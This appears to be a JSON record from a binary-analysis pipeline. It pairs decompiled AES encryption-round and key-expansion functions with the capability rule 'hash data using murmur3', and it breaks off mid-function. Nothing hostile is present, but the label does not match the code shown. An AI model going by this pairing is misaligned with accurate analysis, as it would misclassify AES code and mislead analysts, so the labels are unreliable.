{
    "00401020": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint fcn.00401020(uint32_t *param_1, uint32_t *param_2, uint32_t *param_3)\n\n{\n    char cVar1;\n    char32_t cVar2;\n    char32_t cVar3;\n    char32_t cVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t *puVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    \n    cVar1 = *(param_3 + 0x3c);\n    uVar9 = *param_1 ^ *param_3;\n    uVar14 = param_1[1] ^ param_3[1];\n    uVar12 = param_1[2] ^ param_3[2];\n    uVar13 = param_1[3] ^ param_3[3];\n    if (cVar1 != -0x60) {\n        puVar16 = param_3;\n        if (cVar1 != -0x40) {\n            if (cVar1 != -0x20) {\n                return 0xffffffff;\n            }\n            uVar19 = param_3[7] ^ *((uVar13 & 0xff) * 4 + 0x409240) ^ *((uVar9 >> 8 & 0xff) * 4 + 0x409640) ^\n                     *((uVar14 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar12 >> 0x18) * 4 + 0x409e40);\n            uVar17 = param_3[6] ^ *((uVar12 & 0xff) * 4 + 0x409240) ^ *((uVar13 >> 8 & 0xff) * 4 + 0x409640) ^\n                     *((uVar14 >> 0x18) * 4 + 0x409e40) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x409a40);\n            uVar10 = *((uVar9 & 0xff) * 4 + 0x409240) ^ *(((uVar14 & 0xffff) >> 8) * 4 + 0x409640) ^\n                     *((uVar13 >> 0x18) * 4 + 0x409e40) ^ *((uVar12 >> 0x10 & 0xff) * 4 + 0x409a40) ^ param_3[4];\n            uVar14 = *((uVar13 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar12 >> 8 & 0xff) * 4 + 0x409640) ^\n                     *((uVar14 & 0xff) * 4 + 0x409240) ^ *((uVar9 >> 0x18) * 4 + 0x409e40) ^ param_3[5];\n            puVar16 = param_3 + 8;\n            uVar13 = param_3[0xb] ^ *((uVar19 & 0xff) * 4 + 0x409240) ^ *((uVar10 >> 8 & 0xff) * 4 + 0x409640) ^\n                     *((uVar14 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar17 >> 0x18) * 4 + 0x409e40);\n            uVar12 = param_3[10] ^ *((uVar17 & 0xff) * 4 + 0x409240) ^ *((uVar19 >> 8 & 0xff) * 4 + 0x409640) ^\n                     *((uVar14 >> 0x18) * 4 + 0x409e40) ^ *((uVar10 >> 0x10 & 0xff) * 4 + 0x409a40);\n            uVar9 = *((uVar10 & 0xff) * 4 + 0x409240) ^ *(((uVar14 & 0xffff) >> 8) * 4 + 0x409640) ^\n                    *((uVar19 >> 0x18) * 4 + 0x409e40) ^ *((uVar17 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *puVar16;\n            uVar14 = *((uVar19 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar17 >> 8 & 0xff) * 4 + 0x409640) ^\n                     *((uVar14 & 0xff) * 4 + 0x409240) ^ *((uVar10 >> 0x18) * 4 + 0x409e40) ^ param_3[9];\n        }\n        uVar19 = puVar16[7] ^ *((uVar13 & 0xff) * 4 + 0x409240) ^ *((uVar9 >> 8 & 0xff) * 4 + 0x409640) ^\n                 *((uVar14 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar12 >> 0x18) * 4 + 0x409e40);\n        uVar17 = puVar16[6] ^ *((uVar12 & 0xff) * 4 + 0x409240) ^ *((uVar13 >> 8 & 0xff) * 4 + 0x409640) ^\n                 *((uVar14 >> 0x18) * 4 + 0x409e40) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x409a40);\n        uVar10 = *((uVar9 & 0xff) * 4 + 0x409240) ^ *(((uVar14 & 0xffff) >> 8) * 4 + 0x409640) ^\n                 *((uVar13 >> 0x18) * 4 + 0x409e40) ^ *((uVar12 >> 0x10 & 0xff) * 4 + 0x409a40) ^ puVar16[4];\n        uVar14 = *((uVar13 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar12 >> 8 & 0xff) * 4 + 0x409640) ^\n                 *((uVar14 & 0xff) * 4 + 0x409240) ^ *((uVar9 >> 0x18) * 4 + 0x409e40) ^ puVar16[5];\n        param_3 = puVar16 + 8;\n        uVar13 = puVar16[0xb] ^ *((uVar19 & 0xff) * 4 + 0x409240) ^ *((uVar10 >> 8 & 0xff) * 4 + 0x409640) ^\n                 *((uVar14 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar17 >> 0x18) * 4 + 0x409e40);\n        uVar12 = puVar16[10] ^ *((uVar17 & 0xff) * 4 + 0x409240) ^ *((uVar19 >> 8 & 0xff) * 4 + 0x409640) ^\n                 *((uVar14 >> 0x18) * 4 + 0x409e40) ^ *((uVar10 >> 0x10 & 0xff) * 4 + 0x409a40);\n        uVar9 = *((uVar10 & 0xff) * 4 + 0x409240) ^ *(((uVar14 & 0xffff) >> 8) * 4 + 0x409640) ^\n                *((uVar19 >> 0x18) * 4 + 0x409e40) ^ *((uVar17 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *param_3;\n        uVar14 = *((uVar19 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar17 >> 8 & 0xff) * 4 + 0x409640) ^\n                 *((uVar14 & 0xff) * 4 + 0x409240) ^ *((uVar10 >> 0x18) * 4 + 0x409e40) ^ puVar16[9];\n    }\n    uVar19 = param_3[7] ^ *((uVar13 & 0xff) * 4 + 0x409240) ^ *((uVar9 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar14 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar12 >> 0x18) * 4 + 0x409e40);\n    uVar17 = param_3[6] ^ *((uVar12 & 0xff) * 4 + 0x409240) ^ *((uVar13 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar14 >> 0x18) * 4 + 0x409e40) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x409a40);\n    uVar10 = *((uVar9 & 0xff) * 4 + 0x409240) ^ *(((uVar14 & 0xffff) >> 8) * 4 + 0x409640) ^\n             *((uVar13 >> 0x18) * 4 + 0x409e40) ^ *((uVar12 >> 0x10 & 0xff) * 4 + 0x409a40) ^ param_3[4];\n    uVar12 = *((uVar13 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar12 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar14 & 0xff) * 4 + 0x409240) ^ *((uVar9 >> 0x18) * 4 + 0x409e40) ^ param_3[5];\n    uVar20 = param_3[0xb] ^ *((uVar19 & 0xff) * 4 + 0x409240) ^ *((uVar10 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar12 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar17 >> 0x18) * 4 + 0x409e40);\n    uVar14 = param_3[10] ^ *((uVar17 & 0xff) * 4 + 0x409240) ^ *((uVar19 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar12 >> 0x18) * 4 + 0x409e40) ^ *((uVar10 >> 0x10 & 0xff) * 4 + 0x409a40);\n    uVar9 = *((uVar10 & 0xff) * 4 + 0x409240) ^ *(((uVar12 & 0xffff) >> 8) * 4 + 0x409640) ^\n            *((uVar19 >> 0x18) * 4 + 0x409e40) ^ *((uVar17 >> 0x10 & 0xff) * 4 + 0x409a40) ^ param_3[8];\n    uVar13 = *((uVar19 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar17 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar12 & 0xff) * 4 + 0x409240) ^ *((uVar10 >> 0x18) * 4 + 0x409e40) ^ param_3[9];\n    uVar17 = param_3[0xf] ^ *((uVar20 & 0xff) * 4 + 0x409240) ^ *((uVar9 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar14 >> 0x18) * 4 + 0x409e40);\n    uVar10 = param_3[0xe] ^ *((uVar14 & 0xff) * 4 + 0x409240) ^ *((uVar20 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 >> 0x18) * 4 + 0x409e40) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x409a40);\n    uVar12 = *((uVar9 & 0xff) * 4 + 0x409240) ^ *(((uVar13 & 0xffff) >> 8) * 4 + 0x409640) ^\n             *((uVar20 >> 0x18) * 4 + 0x409e40) ^ *((uVar14 >> 0x10 & 0xff) * 4 + 0x409a40) ^ param_3[0xc];\n    uVar13 = *((uVar20 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar14 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 & 0xff) * 4 + 0x409240) ^ *((uVar9 >> 0x18) * 4 + 0x409e40) ^ param_3[0xd];\n    uVar19 = param_3[0x13] ^ *((uVar17 & 0xff) * 4 + 0x409240) ^ *((uVar12 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar10 >> 0x18) * 4 + 0x409e40);\n    uVar14 = param_3[0x12] ^ *((uVar10 & 0xff) * 4 + 0x409240) ^ *((uVar17 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 >> 0x18) * 4 + 0x409e40) ^ *((uVar12 >> 0x10 & 0xff) * 4 + 0x409a40);\n    uVar9 = *((uVar12 & 0xff) * 4 + 0x409240) ^ *(((uVar13 & 0xffff) >> 8) * 4 + 0x409640) ^\n            *((uVar17 >> 0x18) * 4 + 0x409e40) ^ *((uVar10 >> 0x10 & 0xff) * 4 + 0x409a40) ^ param_3[0x10];\n    uVar13 = *((uVar17 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar10 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 & 0xff) * 4 + 0x409240) ^ *((uVar12 >> 0x18) * 4 + 0x409e40) ^ param_3[0x11];\n    uVar17 = param_3[0x17] ^ *((uVar19 & 0xff) * 4 + 0x409240) ^ *((uVar9 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar14 >> 0x18) * 4 + 0x409e40);\n    uVar10 = param_3[0x16] ^ *((uVar14 & 0xff) * 4 + 0x409240) ^ *((uVar19 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 >> 0x18) * 4 + 0x409e40) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x409a40);\n    uVar12 = *((uVar9 & 0xff) * 4 + 0x409240) ^ *(((uVar13 & 0xffff) >> 8) * 4 + 0x409640) ^\n             *((uVar19 >> 0x18) * 4 + 0x409e40) ^ *((uVar14 >> 0x10 & 0xff) * 4 + 0x409a40) ^ param_3[0x14];\n    uVar13 = *((uVar19 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar14 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 & 0xff) * 4 + 0x409240) ^ *((uVar9 >> 0x18) * 4 + 0x409e40) ^ param_3[0x15];\n    uVar19 = param_3[0x1b] ^ *((uVar17 & 0xff) * 4 + 0x409240) ^ *((uVar12 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar10 >> 0x18) * 4 + 0x409e40);\n    uVar14 = param_3[0x1a] ^ *((uVar10 & 0xff) * 4 + 0x409240) ^ *((uVar17 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 >> 0x18) * 4 + 0x409e40) ^ *((uVar12 >> 0x10 & 0xff) * 4 + 0x409a40);\n    uVar9 = *((uVar12 & 0xff) * 4 + 0x409240) ^ *(((uVar13 & 0xffff) >> 8) * 4 + 0x409640) ^\n            *((uVar17 >> 0x18) * 4 + 0x409e40) ^ *((uVar10 >> 0x10 & 0xff) * 4 + 0x409a40) ^ param_3[0x18];\n    uVar13 = *((uVar17 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar10 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 & 0xff) * 4 + 0x409240) ^ *((uVar12 >> 0x18) * 4 + 0x409e40) ^ param_3[0x19];\n    uVar17 = param_3[0x1f] ^ *((uVar19 & 0xff) * 4 + 0x409240) ^ *((uVar9 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar14 >> 0x18) * 4 + 0x409e40);\n    uVar10 = param_3[0x1e] ^ *((uVar14 & 0xff) * 4 + 0x409240) ^ *((uVar19 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 >> 0x18) * 4 + 0x409e40) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x409a40);\n    uVar12 = *((uVar9 & 0xff) * 4 + 0x409240) ^ *(((uVar13 & 0xffff) >> 8) * 4 + 0x409640) ^\n             *((uVar19 >> 0x18) * 4 + 0x409e40) ^ *((uVar14 >> 0x10 & 0xff) * 4 + 0x409a40) ^ param_3[0x1c];\n    uVar13 = *((uVar19 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar14 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 & 0xff) * 4 + 0x409240) ^ *((uVar9 >> 0x18) * 4 + 0x409e40) ^ param_3[0x1d];\n    uVar19 = param_3[0x23] ^ *((uVar17 & 0xff) * 4 + 0x409240) ^ *((uVar12 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar10 >> 0x18) * 4 + 0x409e40);\n    uVar14 = param_3[0x22] ^ *((uVar10 & 0xff) * 4 + 0x409240) ^ *((uVar17 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 >> 0x18) * 4 + 0x409e40) ^ *((uVar12 >> 0x10 & 0xff) * 4 + 0x409a40);\n    uVar9 = *((uVar12 & 0xff) * 4 + 0x409240) ^ *(((uVar13 & 0xffff) >> 8) * 4 + 0x409640) ^\n            *((uVar17 >> 0x18) * 4 + 0x409e40) ^ *((uVar10 >> 0x10 & 0xff) * 4 + 0x409a40) ^ param_3[0x20];\n    uVar12 = *((uVar17 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar10 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar13 & 0xff) * 4 + 0x409240) ^ *((uVar12 >> 0x18) * 4 + 0x409e40) ^ param_3[0x21];\n    uVar21 = param_3[0x27] ^ *((uVar19 & 0xff) * 4 + 0x409240) ^ *((uVar9 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar12 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar14 >> 0x18) * 4 + 0x409e40);\n    uVar18 = param_3[0x26] ^ *((uVar14 & 0xff) * 4 + 0x409240) ^ *((uVar19 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar12 >> 0x18) * 4 + 0x409e40) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x409a40);\n    uVar11 = *((uVar9 & 0xff) * 4 + 0x409240) ^ *(((uVar12 & 0xffff) >> 8) * 4 + 0x409640) ^\n             *((uVar19 >> 0x18) * 4 + 0x409e40) ^ *((uVar14 >> 0x10 & 0xff) * 4 + 0x409a40) ^ param_3[0x24];\n    uVar15 = *((uVar19 >> 0x10 & 0xff) * 4 + 0x409a40) ^ *((uVar14 >> 8 & 0xff) * 4 + 0x409640) ^\n             *((uVar12 & 0xff) * 4 + 0x409240) ^ *((uVar9 >> 0x18) * 4 + 0x409e40) ^ param_3[0x25];\n    uVar9 = param_3[0x2a];\n    uVar12 = param_3[0x2b];\n    cVar2 = L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n            [uVar18 & 0xff];\n    uVar13 = *((uVar21 >> 8 & 0xff) * 4 + 0x40a640);\n    uVar14 = *((uVar15 >> 0x18) * 4 + 0x40ae40);\n    cVar3 = L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n            [uVar21 & 0xff];\n    uVar10 = *((uVar11 >> 8 & 0xff) * 4 + 0x40a640);\n    uVar17 = *((uVar15 >> 0x10 & 0xff) * 4 + 0x40aa40);\n    uVar19 = *((uVar21 >> 0x10 & 0xff) * 4 + 0x40aa40);\n    uVar20 = *((uVar18 >> 8 & 0xff) * 4 + 0x40a640);\n    cVar4 = L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n            [uVar15 & 0xff];\n    uVar5 = *((uVar18 >> 0x18) * 4 + 0x40ae40);\n    uVar6 = *((uVar11 >> 0x10 & 0xff) * 4 + 0x40aa40);\n    uVar7 = *((uVar11 >> 0x18) * 4 + 0x40ae40);\n    uVar8 = param_3[0x29];\n    *param_2 = L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n               [uVar11 & 0xff] ^ *(((uVar15 & 0xffff) >> 8) * 4 + 0x40a640) ^ *((uVar21 >> 0x18) * 4 + 0x40ae40) ^\n               *((uVar18 >> 0x10 & 0xff) * 4 + 0x40aa40) ^ param_3[0x28];\n    param_2[1] = uVar19 ^ uVar20 ^ cVar4 ^ uVar7 ^ uVar8;\n    param_2[2] = uVar9 ^ cVar2 ^ uVar13 ^ uVar14 ^ uVar6;\n    param_2[3] = uVar12 ^ cVar3 ^ uVar10 ^ uVar17 ^ uVar5;\n    return 0;\n}\n",
        "token_count": 6779
    },
    "00407ee0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407ee0(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *arg_8h;\n    *arg_ch = uVar1;\n    uVar4 = arg_8h[1];\n    arg_ch[1] = uVar4;\n    uVar2 = arg_8h[2];\n    arg_ch[2] = uVar2;\n    uVar3 = arg_8h[3];\n    arg_ch[3] = uVar3;\n    uVar5 = arg_8h[4];\n    arg_ch[4] = uVar5;\n    uVar7 = arg_8h[5];\n    arg_ch[5] = uVar7;\n    uVar8 = arg_8h[6];\n    arg_ch[6] = uVar8;\n    uVar6 = arg_8h[7];\n    arg_ch[7] = uVar6;\n    uVar1 = uVar1 ^ *((uVar6 >> 0x18) * 4 + 0x40aa40) ^ *((uVar6 >> 0x10 & 0xff) * 4 + 0x40a640) ^\n                    L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n                    [uVar6 >> 8 & 0xff] ^ *((uVar6 & 0xff) * 4 + 0x40ae40) ^ *0x409200;\n    arg_ch[8] = uVar1;\n    uVar4 = uVar4 ^ uVar1;\n    arg_ch[9] = uVar4;\n    uVar2 = uVar2 ^ uVar4;\n    arg_ch[10] = uVar2;\n    uVar3 = uVar3 ^ uVar2;\n    arg_ch[0xb] = uVar3;\n    uVar5 = uVar5 ^ *((uVar3 >> 0x18) * 4 + 0x40ae40) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x40aa40) ^\n                    *((uVar3 >> 8 & 0xff) * 4 + 0x40a640) ^\n                    L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n                    [uVar3 & 0xff];\n    uVar7 = uVar7 ^ uVar5;\n    uVar8 = uVar8 ^ uVar7;\n    uVar6 = uVar6 ^ uVar8;\n    arg_ch[0xc] = uVar5;\n    arg_ch[0xd] = uVar7;\n    arg_ch[0xe] = uVar8;\n    arg_ch[0xf] = uVar6;\n    uVar1 = uVar1 ^ *((uVar6 >> 0x18) * 4 + 0x40aa40) ^ *((uVar6 >> 0x10 & 0xff) * 4 + 0x40a640) ^\n                    L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n                    [uVar6 >> 8 & 0xff] ^ *((uVar6 & 0xff) * 4 + 0x40ae40) ^ *0x409204;\n    arg_ch[0x10] = uVar1;\n    uVar4 = uVar4 ^ uVar1;\n    arg_ch[0x11] = uVar4;\n    uVar2 = uVar2 ^ uVar4;\n    arg_ch[0x12] = uVar2;\n    uVar3 = uVar3 ^ uVar2;\n    arg_ch[0x13] = uVar3;\n    uVar5 = uVar5 ^ *((uVar3 >> 0x18) * 4 + 0x40ae40) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x40aa40) ^\n                    *((uVar3 >> 8 & 0xff) * 4 + 0x40a640) ^\n                    L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n                    [uVar3 & 0xff];\n    uVar7 = uVar7 ^ uVar5;\n    uVar8 = uVar8 ^ uVar7;\n    uVar6 = uVar6 ^ uVar8;\n    arg_ch[0x14] = uVar5;\n    arg_ch[0x15] = uVar7;\n    arg_ch[0x16] = uVar8;\n    arg_ch[0x17] = uVar6;\n    uVar1 = uVar1 ^ *((uVar6 >> 0x18) * 4 + 0x40aa40) ^ *((uVar6 >> 0x10 & 0xff) * 4 + 0x40a640) ^\n                    L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n                    [uVar6 >> 8 & 0xff] ^ *((uVar6 & 0xff) * 4 + 0x40ae40) ^ *0x409208;\n    arg_ch[0x18] = uVar1;\n    uVar4 = uVar4 ^ uVar1;\n    arg_ch[0x19] = uVar4;\n    uVar2 = uVar2 ^ uVar4;\n    arg_ch[0x1a] = uVar2;\n    uVar3 = uVar3 ^ uVar2;\n    arg_ch[0x1b] = uVar3;\n    uVar5 = uVar5 ^ *((uVar3 >> 0x18) * 4 + 0x40ae40) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x40aa40) ^\n                    *((uVar3 >> 8 & 0xff) * 4 + 0x40a640) ^\n                    L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n                    [uVar3 & 0xff];\n    uVar7 = uVar7 ^ uVar5;\n    uVar8 = uVar8 ^ uVar7;\n    uVar6 = uVar6 ^ uVar8;\n    arg_ch[0x1c] = uVar5;\n    arg_ch[0x1d] = uVar7;\n    arg_ch[0x1e] = uVar8;\n    arg_ch[0x1f] = uVar6;\n    uVar1 = uVar1 ^ *((uVar6 >> 0x18) * 4 + 0x40aa40) ^ *((uVar6 >> 0x10 & 0xff) * 4 + 0x40a640) ^\n                    L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n                    [uVar6 >> 8 & 0xff] ^ *((uVar6 & 0xff) * 4 + 0x40ae40) ^ *0x40920c;\n    arg_ch[0x20] = uVar1;\n    uVar4 = uVar4 ^ uVar1;\n    arg_ch[0x21] = uVar4;\n    uVar2 = uVar2 ^ uVar4;\n    arg_ch[0x22] = uVar2;\n    uVar3 = uVar3 ^ uVar2;\n    arg_ch[0x23] = uVar3;\n    uVar5 = uVar5 ^ *((uVar3 >> 0x18) * 4 + 0x40ae40) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x40aa40) ^\n                    *((uVar3 >> 8 & 0xff) * 4 + 0x40a640) ^\n                    L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n                    [uVar3 & 0xff];\n    uVar7 = uVar7 ^ uVar5;\n    uVar8 = uVar8 ^ uVar7;\n    arg_ch[0x24] = uVar5;\n    arg_ch[0x25] = uVar7;\n    arg_ch[0x26] = uVar8;\n    uVar6 = uVar6 ^ uVar8;\n    arg_ch[0x27] = uVar6;\n    uVar1 = uVar1 ^ *((uVar6 >> 0x18) * 4 + 0x40aa40) ^ *((uVar6 >> 0x10 & 0xff) * 4 + 0x40a640) ^\n                    